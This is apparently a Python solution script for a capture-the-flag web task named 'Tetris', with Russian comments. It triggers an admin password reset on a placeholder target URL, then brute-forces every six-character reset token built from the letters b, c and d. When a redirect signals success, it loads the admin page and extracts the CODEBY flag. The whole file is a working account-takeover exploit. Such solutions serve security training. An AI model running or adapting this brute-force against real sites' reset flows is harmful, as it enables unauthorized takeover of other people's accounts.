# для решения таска с категории Веб "Тетрис"

import requests
from itertools import product

TARGET_URL = "http://TASK_URL"
ADMIN_USER = "admin"

# 1. Запускаем процесс сброса
requests.post(f"{TARGET_URL}/reset_password", data={"username": ADMIN_USER})

# 2. Генерируем все комбинации токенов
tokens = (''.join(p) for p in product('bcd', repeat=6))

# 3. Перебор токенов
for token in tokens:
    session = requests.Session()
    response = session.get(f"{TARGET_URL}/reset/{token}", allow_redirects=False)
    
    # 4. Проверяем успешный вход
    if response.status_code == 302 and "Location" in response.headers:
        print(f"[+] Valid token: {token}")
        
        # 5. Получаем флаг
        admin_page = session.get(f"{TARGET_URL}/admin")
        if "CODEBY{" in admin_page.text:
            flag = admin_page.text.split("CODEBY{")[1].split("}")[0]
            print(f"[+] FLAG: CODEBY{{{flag}}}")
        else:
            print("[-] Flag not found")
        break
else:
    print("[-] Token not found")
